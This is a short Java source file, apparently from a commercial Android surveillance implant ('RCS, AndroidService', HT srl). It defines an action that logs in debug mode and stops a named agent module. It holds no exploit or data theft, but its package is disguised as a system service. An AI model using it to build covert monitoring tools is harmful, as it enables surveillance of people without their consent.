/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StopAgentAction.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import org.json.JSONObject;

import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAction;
import com.android.service.manager.ManagerAgent;
import com.android.service.util.Check;

public class StopModuleAction extends ModuleAction {
	public StopModuleAction(ConfAction params) {
		super(params);
	}

	private static final String TAG = "StopAgentAction"; //$NON-NLS-1$

	@Override
	public boolean execute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + moduleId) ;//$NON-NLS-1$
		}
		final ManagerAgent agentManager = ManagerAgent.self();

		agentManager.stop(moduleId);
		return true;
	}

}
